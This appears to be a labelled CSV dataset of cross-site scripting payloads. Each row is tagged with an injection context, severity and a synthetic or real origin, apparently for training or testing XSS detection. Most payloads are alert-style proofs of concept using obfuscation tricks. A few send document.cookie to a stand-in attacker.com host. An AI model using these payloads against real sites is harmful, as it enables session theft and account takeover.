payload,context,technique,severity,length,source
"%3Clisting
onpointerrawupdate=alert('XSS')%3E",tag_injection,synthetic,medium,45,synthetic
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG(1)""",dom_sink,synthetic,high,41,synthetic
onsecuritypolicyviolation=javascript:console.log(document.domain),event_handler,synthetic,medium,65,synthetic
"<label draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</label>",tag_injection,none,medium,88,real
<td srC=x onWebKitAniMatIonEnd=prOmpT('XSS')>,tag_injection,synthetic,medium,45,synthetic
"__pRotO__[""oNgeStuResTarT""]=evAl(DocUmeNt.CooKie)",dom_sink,synthetic,high,49,synthetic
' oNanImaTioNitEraTioN=cOnsOle.loG('XSS') ',attribute_escape,synthetic,medium,43,synthetic
 onp&#97;us&#101;=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,47,synthetic
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a>,js_uri,none,medium,88,real
<!--><m&#97;rqu&#101;&#101; on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,74,synthetic
"\"" onpromptaction=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
' onmousewheel=\u0061lert(document.domain) ',attribute_escape,synthetic,low,44,synthetic
"EvaL(""AleRt(StrIng.frOmCHarCodE(88,83,83))"")",dom_sink,synthetic,high,44,synthetic
<script>alert(1)//,script_injection,none,medium,18,real
"<div
onwebkitfullscreenchange=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,68,synthetic
 ong&#101;stur&#101;st&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,69,synthetic
<scr	ipt>prompt`'XSS'`</scr	ipt>,script_injection,synthetic,low,32,synthetic
"<scRipT>cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection,synthetic,high,55,synthetic
<d&#101;t&#97;ils onr&#101;p&#101;&#97;t=prompt(1)/>,tag_injection,synthetic,medium,52,synthetic
"	onPasTe=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,46,synthetic
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,tag_injection,none,medium,72,real
""" on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,low,93,synthetic
%22><img src=x onpaste=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,42,synthetic
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>",tag_injection,none,medium,101,real
<img id=x tabindex=1 onactivate=alert(1)></img>,tag_injection,none,medium,47,real
<scr	ipt>alert`location.hash`</scr	ipt>,script_injection,synthetic,low,39,synthetic
<tr x=Y oNseLecT=cOnsOle.loG(1)>,tag_injection,synthetic,medium,32,synthetic
"<dl onmouseout=""alert(1)"">AnonKryptiQuz</dl>",tag_injection,none,medium,44,real
"\"" OnfOcuS=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,55,synthetic
"SetTimEouT(""XMLHttPReQueSt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)"",0)",dom_sink,synthetic,high,69,synthetic
<scr	ipt	>confirm(document.domain)</scr	ipt>,script_injection,synthetic,medium,44,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=eval(String.fromCharCode(88,83,83))>"")",dom_sink,synthetic,high,97,synthetic
"""><Img srC=x onDblCliCk=ConSolE.lOg('XSS')>",attribute_escape,synthetic,medium,43,synthetic
"<colgroup onmouseleave=""alert(1)"">AnonKryptiQuz</colgroup>",tag_injection,none,medium,58,real
""" oNinValId=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,high,51,synthetic
onpoint&#101;rup=j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,76,synthetic
"<track ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</track>",tag_injection,none,medium,91,real
\' onbegin=confirm(1)//,attribute_escape,synthetic,medium,23,synthetic
"<summary onmouseleave=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,56,real
"<body oncut=""alert(1)"" contenteditable>AnonKryptiQuz</body>",tag_injection,none,medium,59,real
"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable style=display:block>drop here</command>",tag_injection,none,medium,135,real
__proto__[%22onfocusout%22]=confirm(1),dom_sink,synthetic,medium,38,synthetic
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(0701),tag_injection,none,medium,69,real
"%3Cblink onpagehide=confirm(String.fromCharCode(88,83,83)) onpagehide=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,111,synthetic
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionstart=alert(1)></object>",tag_injection,none,medium,112,real
<tr x=y onpointerrawupdate=alert(location.hash)>,tag_injection,synthetic,medium,48,synthetic
'><img src=x onpagehide=prompt('XSS')>,attribute_escape,synthetic,medium,38,synthetic
<spacer onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</spacer><input value=clickme>,tag_injection,none,medium,103,real
"<ol id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></ol>",tag_injection,none,medium,80,real
javascript:alert/***/(1),js_uri,synthetic,low,24,synthetic
"<tt onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</tt>",tag_injection,none,medium,80,real
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,tag_injection,none,medium,67,real
"\' onb&#101;for&#101;p&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,medium,84,synthetic
%27 onfocus=alert(1) %27,attribute_escape,synthetic,medium,24,synthetic
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",dom_sink,none,low,83,real
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;,js_uri,none,medium,97,real
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<table x=y onmozfullscreenchange=confirm(1)>,tag_injection,synthetic,medium,44,synthetic
"""><&#97;nim&#97;t&#101;tr&#97;nsform ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,114,synthetic
"""><tr onanimationend=prompt('XSS')>",tag_injection,synthetic,medium,35,synthetic
"<style>:target {color:red;}</style><dir id=x style=""transition:color 1s"" ontransitionend=alert(1)></dir>",tag_injection,none,medium,104,real
"<select draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</select>",tag_injection,none,medium,85,real
 onpointermove=alert('XSS'),event_handler,synthetic,medium,27,synthetic
'''><SCRIPT>alert(1)',script_injection,case_variation,medium,21,real
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",js_uri,none,medium,90,real
javascript:alert/***/('XSS'),js_uri,synthetic,low,28,synthetic
"<frameset onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</frameset>",tag_injection,none,medium,89,real
onst&#97;ll&#101;d=consol&#101;.log/*x*/(1),event_handler,synthetic,low,43,synthetic
<script>window['alert'](location.hash)</script>,script_injection,synthetic,low,47,synthetic
OnsUbmIt=ProMpt/***/(DocUmeNt.DomAin),event_handler,synthetic,low,37,synthetic
\' onload=console.log(1)//,attribute_escape,synthetic,medium,26,synthetic
"onpromptdismiss=prompt/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,66,synthetic
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onwebkitanimationend=""alert(1)""></meter>",tag_injection,none,medium,101,real
`><img src=x onkeypress=alert('XSS')>,attribute_escape,synthetic,medium,37,synthetic
"<thead draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,88,real
"\"" OnpRomPtdIsmIss=prOmpT(1)//",attribute_escape,synthetic,medium,30,synthetic
%22 ><svg onvolumechange=alert(%27XSS%27)>,attribute_escape,synthetic,medium,42,synthetic
"<acronym onmouseleave=""alert(1)"">AnonKryptiQuz</acronym>",tag_injection,none,medium,56,real
"<noscript oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,101,real
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",tag_injection,none,medium,66,real
"`><Img srC=x onResEt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
'><img src=x onfocusin=prompt(1)>,attribute_escape,synthetic,medium,33,synthetic
"${{'prompt(docum&#101;nt.cooki&#101;)'.r&#101;pl&#97;c&#101;('prompt(docum&#101;nt.cooki&#101;)','')}}",template_injection,synthetic,medium,102,synthetic
{{[].pop.constructor(%27confirm(document.cookie)%27)()}},template_injection,synthetic,high,56,synthetic
"%27 ontoggle=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,55,synthetic
""" ><svg oninv&#97;lid=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,69,synthetic
"<col onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</col>",tag_injection,none,medium,64,real
<sCrIpt>alert(1)</ScRipt>,script_injection,case_variation,medium,25,real
"<option onmousedown=""alert(1)"">AnonKryptiQuz</option>",tag_injection,none,medium,53,real
"s&#101;tTim&#101;out(""XMLHttpR&#101;qu&#101;st(loc&#97;tion.h&#97;sh)"",0)",dom_sink,synthetic,high,73,synthetic
<script>Function('console.log(document.domain)')();</script>,script_injection,synthetic,medium,60,synthetic
%3Cplaintext ontouchstart=alert(1)%3E,tag_injection,synthetic,medium,37,synthetic
{{{prompt(1)}}},template_injection,synthetic,medium,15,synthetic
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></embed>",tag_injection,none,medium,114,real
"<datalist onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</datalist>",tag_injection,none,medium,78,real
"<ol draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</ol>",tag_injection,none,medium,57,real
%3Cbutton onclick=console.log(1) onclick=console.log(1)%3E,tag_injection,synthetic,medium,58,synthetic
"__pRotO__[""oNscRolLenD""]=prOmpT(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink,synthetic,high,70,synthetic
<div style=xss:expressio\6e(alert(1))>,generic,none,medium,38,real
"""><AniMatEmoTioN oNseCurItyPolIcyVioLatIon=coNsoLe.Log('XSS')>",tag_injection,synthetic,medium,62,synthetic
onpageshow=javascr	ipt:prompt(1),event_handler,synthetic,medium,32,synthetic
"__proto__[""onend""]=XMLHttpRequest(document.domain)",dom_sink,synthetic,high,50,synthetic
"onlo&#97;d=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,65,synthetic
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//,dom_sink,none,high,61,real
"<style onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></style>",tag_injection,none,medium,283,real
"setInterval(%22console.log(document.cookie+%27&loc=%27+location.href)%22,100)",dom_sink,synthetic,high,77,synthetic
<input type=image src=validimage.png onload=alert(1)>,tag_injection,none,medium,53,real
"\%27 onkeypress=console.log(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,60,synthetic
 onBefOreInpUt=ConSolE.lOg(DocUmeNt.DomAin),event_handler,synthetic,medium,43,synthetic
"__pRotO__[""oNpoIntErcAncEl""]=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",dom_sink,synthetic,high,71,synthetic
""" ><svg onsearch=prompt(document.domain)>",attribute_escape,synthetic,medium,41,synthetic
"""><AniMatEmoTioN oNanImaTioNitEraTioN=cOnsOle.loG('XSS')>",tag_injection,synthetic,medium,57,synthetic
"&quOt; onEndEd=AleRt(StrIng.frOmCHarCodE(88,83,83)) x=&quOt;",attribute_escape,synthetic,high,60,synthetic
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",tag_injection,none,medium,105,real
&#39;&#88;&#83;&#83;&#39;&#41;>,generic,html_entity,low,31,real
"LocAtiOn=""jaVasCriPt:XMLHttPReQueSt('//AttAckEr.Com/?c='+DocUmeNt.CooKie)""",dom_sink,synthetic,high,74,synthetic
"<article id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></article>",tag_injection,none,medium,90,real
"onbeforetoggle=javascript:prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,63,synthetic
"""%3E%3Cimg src=x onpointercancel=console.log(document.domain)%3E",attribute_escape,synthetic,medium,64,synthetic
\%22 onsearch=confirm(1)//,attribute_escape,synthetic,medium,26,synthetic
"j&#97;v&#97;script:prompt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,low,70,synthetic
oninvalid=javascr	ipt:prompt(1),event_handler,synthetic,medium,31,synthetic
eval(%22prompt(location.hash)%22),dom_sink,synthetic,medium,33,synthetic
%3Caudio	onplay=console.log(1)%3E,tag_injection,synthetic,medium,33,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=prompt(document.domain)>"")",dom_sink,synthetic,medium,85,synthetic
`><Img srC=x onLoaD=aLerT(1)>,attribute_escape,synthetic,medium,29,synthetic
OnwEbkIttRanSitIonEnd=alErt('XSS'),event_handler,synthetic,medium,34,synthetic
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",tag_injection,none,medium,115,real
document.write(%22<img src=x onerror=fetch(1)>%22),dom_sink,synthetic,high,50,synthetic
onchange=confirm(location.hash),event_handler,synthetic,medium,31,synthetic
"`><Img srC=x onErrOr=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
<% confirm(docum&#101;nt.dom&#97;in) %>,template_injection,synthetic,medium,39,synthetic
%3Carea	onpageshow=prompt('XSS')%3E,tag_injection,synthetic,medium,35,synthetic
"' oNenDed=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape,synthetic,high,50,synthetic
"' ><svg onplay=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,53,synthetic
"<dt oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,95,real
%22><set onclose=confirm(document.domain)>,tag_injection,synthetic,medium,42,synthetic
{{#WitH pRomPt('XSS')}}...{{/wIth}},template_injection,synthetic,medium,35,synthetic
"<base	ontouchmove=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,61,synthetic
on&#101;nd=j&#97;v&#97;script:prompt(1),event_handler,synthetic,medium,39,synthetic
"<rtc draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,84,real
oncut=\u0061lert(1),event_handler,synthetic,low,19,synthetic
"<ruby onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",tag_injection,none,medium,63,real
#{\u0061lert('XSS')},template_injection,synthetic,low,20,synthetic
"__proto__[""onsecuritypolicyviolation""]=\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,105,synthetic
j&#97;v&#97;script:%0&#97;prompt(1),js_uri,synthetic,medium,35,synthetic
"<dt onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",tag_injection,none,medium,66,real
	onChaNge=coNfiRm(LocAtiOn.HasH),event_handler,synthetic,medium,32,synthetic
ondr&#97;g&#101;nt&#101;r=prompt/**/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,62,synthetic
onmouseenter=javascript:\u0061lert(1),event_handler,synthetic,low,37,synthetic
""" ongesturestart=alert(location.hash) """,attribute_escape,synthetic,medium,39,synthetic
"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",tag_injection,none,medium,130,real
<foRm	OnpAgeHidE=cOnfIrm(1)>,tag_injection,synthetic,medium,28,synthetic
"\"" OnpAgeShoW=pRomPt(DocUmeNt.DomAin)//",attribute_escape,synthetic,medium,39,synthetic
"'><img src=x ontouchstart=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,63,synthetic
"<big onmouseout=""alert(1)"">AnonKryptiQuz</big>",tag_injection,none,medium,46,real
"<rtc onmouseup=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,45,real
"""><&#97;r&#101;&#97; onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,low,94,synthetic
""" ><svg on&#97;nim&#97;tionit&#101;r&#97;tion=confirm('XSS')>",attribute_escape,synthetic,medium,61,synthetic
"<bdi draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",tag_injection,none,medium,82,real
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></label>",tag_injection,none,medium,114,real
	onkeydown=alert('XSS'),event_handler,synthetic,medium,23,synthetic
<td onstalled=confirm('XSS') onstalled=confirm('XSS')>,tag_injection,synthetic,medium,54,synthetic
java	scr	ipt:console.log(document.domain),js_uri,synthetic,medium,41,synthetic
"\"" onst&#97;ll&#101;d=prompt(1)//",attribute_escape,synthetic,medium,33,synthetic
"<style>:target {color:red;}</style><command id=x style=""transition:color 1s"" ontransitionstart=alert(1)></command>",tag_injection,none,medium,114,real
<obj&#101;ct/onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,90,synthetic
"<table onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</table>",tag_injection,none,medium,69,real
"<hr ondblclick=""alert(1)"">AnonKryptiQuz</hr>",tag_injection,none,medium,44,real
"""><img src=x onbeforepaste=prompt(1)>",attribute_escape,synthetic,medium,37,synthetic
"'><Img srC=x onCloSe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
"\"";alert(9492);//",generic,none,medium,17,real
"""><plaintext ontouchstart=alert(1)>",tag_injection,synthetic,medium,35,synthetic
OnwEbkItfUllScrEenChaNge=prOmpT&#40;1&#41;,event_handler,synthetic,low,42,synthetic
"<progress onclick=""alert(1)"">AnonKryptiQuz</progress>",tag_injection,none,medium,53,real
"<rtc onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",tag_injection,none,medium,59,real
<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,tag_injection,none,medium,82,real
"<tbody onmouseup=""alert(1)"">AnonKryptiQuz</tbody>",tag_injection,none,medium,49,real
%3Cblink src=x onpopstate=console.log(document.domain)%3E,tag_injection,synthetic,medium,57,synthetic
"<dl onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dl>",tag_injection,none,medium,80,real
<script>window['console.log'](1)</script>,script_injection,synthetic,low,41,synthetic
"""><BodY oNinValId=AleRt(LocAtiOn.HasH)>",tag_injection,synthetic,medium,39,synthetic
%3Ctitle onmozfullscreenchange=prompt('XSS')/%3E,tag_injection,synthetic,medium,48,synthetic
"OngOtpOinTerCapTurE=aLerT/**/(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,60,synthetic
%22 ><svg onauxclick=alert(1)>,attribute_escape,synthetic,medium,30,synthetic
<embed id=x onfocusin=alert(1) type=text/html>,tag_injection,none,medium,46,real
"<INPUT+TYPE=""checkbox""+onDblClick=confirm(AnonKryptiQuz)>",tag_injection,case_variation,medium,57,real
"document.body.innerHTML=""<img src=x onerror=confirm('XSS')>""",dom_sink,synthetic,high,60,synthetic
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,tag_injection,none,medium,66,real
